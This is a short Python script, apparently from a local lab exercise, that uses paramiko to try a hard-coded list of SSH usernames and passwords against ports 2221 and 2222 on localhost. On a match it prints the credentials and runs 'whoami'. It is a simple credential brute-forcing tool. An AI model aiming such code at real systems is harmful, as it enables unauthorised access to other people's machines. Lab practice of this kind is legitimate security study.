import paramiko
import time

CREDENTIALS = [
    ('usuario', 'password'),
    ('servidor1', 'servidor1'),
    ('servidor2', 'servidor2'),
    ('usuario', 'servidor1'),
    ('usuario', 'servidor2'),
    ('root', 'servidor1'),
    ('root', 'servidor2')
]

PORTS = [2221, 2222]

def try_connect(port):
    print(f"\nScanning Port {port}...")
    for user, pwd in CREDENTIALS:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect('127.0.0.1', port=port, username=user, password=pwd, timeout=3)
            print(f"✅ MATCH FOUND! Port {port} -> User: '{user}', Pass: '{pwd}'")
            stdin, stdout, stderr = client.exec_command("whoami")
            print(f"   Command Test (whoami): {stdout.read().decode().strip()}")
            client.close()
            return (user, pwd)
        except paramiko.AuthenticationException:
            pass # Wrong creds
        except Exception as e:
            print(f"   ❌ Connection Error on {port}: {e}")
            return None
        finally:
            client.close()
    
    print(f"⚠️ No valid credentials found for Port {port} in list.")
    return None

if __name__ == "__main__":
    found_1 = try_connect(2221)
    found_2 = try_connect(2222)
